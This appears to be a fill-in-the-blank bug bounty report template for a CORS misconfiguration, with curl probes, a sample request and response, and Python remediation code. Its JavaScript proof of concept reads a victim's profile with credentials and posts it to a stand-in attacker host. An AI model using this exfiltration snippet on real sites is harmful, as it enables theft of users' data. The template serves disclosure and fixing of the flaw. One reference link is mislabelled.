# 🐛 [PROGRAM] - CORS Misconfiguration

## 📋 Report Metadata

| Field | Value |
|-------|-------|
| **Platform** | HackerOne / Bugcrowd / Intigriti |
| **Program** | `[PROGRAM_NAME]` |
| **Vulnerability** | CORS Misconfiguration |
| **Severity** | HIGH / MEDIUM / LOW |
| **Report Date** | YYYY-MM-DD |
| **Target URL** | `https://api.target.com/endpoint` |
| **CWE** | CWE-942: Permissive Cross-Domain Policy |

---

## 📝 Summary

A Cross-Origin Resource Sharing (CORS) misconfiguration was discovered in `[TARGET_ENDPOINT]`, allowing unauthorized cross-origin access to sensitive data.

**Attack Scenario:** An attacker could craft a malicious webpage that makes requests to `[TARGET_ENDPOINT]` on behalf of authenticated users, potentially exposing:
- User profile information
- API keys/tokens in responses
- Payment/billing data
- Session cookies (if `Access-Control-Allow-Credentials: true`)

---

## 🔍 Steps to Reproduce

1. Navigate to: `https://api.target.com/v1/user/profile`
2. Send a request with the following headers:
   ```
   Origin: https://attacker-controlled-domain.com
   Cookie: [user's session cookie]
   ```
3. Observe the response includes:
   ```
   Access-Control-Allow-Origin: https://attacker-controlled-domain.com
   Access-Control-Allow-Credentials: true
   ```
4. This confirms the server reflects the attacker's origin and allows credentialed requests.

---

## 📂 Affected Endpoints

| Endpoint | Method | Origin Reflected | Credentials Allowed |
|----------|--------|------------------|---------------------|
| `/api/v1/profile` | GET | ✅ Yes | ✅ Yes |
| `/api/v1/settings` | GET | ✅ Yes | ✅ Yes |

---

## 💥 PoC (Proof of Concept)

```bash
# Step 1: Test normal request
curl -i "https://api.target.com/v1/profile" -H "Origin: https://legitimate-site.com"

# Response (Expected - Legitimate):
# HTTP/1.1 200 OK
# Access-Control-Allow-Origin: https://legitimate-site.com
# Access-Control-Allow-Credentials: true

# Step 2: Test with attacker origin
curl -i "https://api.target.com/v1/profile" -H "Origin: https://evil.attacker.com"

# Response (VULNERABLE):
# HTTP/1.1 200 OK
# Access-Control-Allow-Origin: https://evil.attacker.com
# Access-Control-Allow-Credentials: true

# The server reflects the attacker-controlled origin!
```

**JavaScript Exploit (on attacker's site):**
```javascript
fetch('https://api.target.com/v1/profile', {
  credentials: 'include'
}).then(response => response.json())
  .then(data => {
    // Send stolen data to attacker's server
    fetch('https://evil.attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
```

---

## 🔬 Evidence

```
Request:
GET /v1/profile HTTP/1.1
Host: api.target.com
Origin: https://evil.attacker.com
Cookie: session=abc123...

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.attacker.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Content-Type: application/json

{"id": 12345, "email": "user@target.com", "name": "John Doe"}
```

---

## ⚠️ Impact

| Impact Type | Description |
|-------------|-------------|
| **Confidentiality** | Attackers can read sensitive user data returned by the API |
| **Integrity** | Attackers may perform actions on behalf of authenticated users |
| **Authentication Bypass** | Session cookies may be exposed to attacker-controlled origins |
| **Account Takeover** | In severe cases, combined with other vulnerabilities |

**CVSS 3.1 Score:** 7.5 (High)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: Required (victim must visit attacker page)
- Scope: Changed (affects other domain)

---

## 🔧 Remediation

1. **Use strict allowlist for allowed origins:**
   ```python
   ALLOWED_ORIGINS = [
       'https://app.target.com',
       'https://www.target.com',
       'https://dashboard.target.com'
   ]
   
   @app.after_request
   def set_cors_headers(response):
       origin = request.headers.get('Origin')
       if origin in ALLOWED_ORIGINS:
           response.headers['Access-Control-Allow-Origin'] = origin
           response.headers['Access-Control-Allow-Credentials'] = 'true'
       return response
   ```

2. **Never use `*` with credentials:**
   ```python
   # BAD - VULNERABLE!
   response.headers['Access-Control-Allow-Origin'] = '*'
   response.headers['Access-Control-Allow-Credentials'] = 'true'
   
   # GOOD - Secure
   response.headers['Access-Control-Allow-Origin'] = specific_origin
   ```

3. **Validate Origin header server-side** - Don't trust client-supplied Origin

4. **Use SameSite cookies** - Add `SameSite=Strict` or `SameSite=Lax`

---

## 📚 References

- [OWASP CORS Security Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN CORS Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [CWE-942: Permissive Cross-Domain Policy](https://cwe.mitre.org/data/definitions/942.html)

---

## 📅 Timeline

- **Date Discovered:** YYYY-MM-DD
- **Date Reported:** YYYY-MM-DD
- **Date Acknowledged:** YYYY-MM-DD (awaiting)
- **Date Fixed:** YYYY-MM-DD (pending)

---

**Reporter:** [YOUR_HANDLE]
**Platform Profile:** [YOUR_HACKERONE_PROFILE]
**Last Updated:** YYYY-MM-DD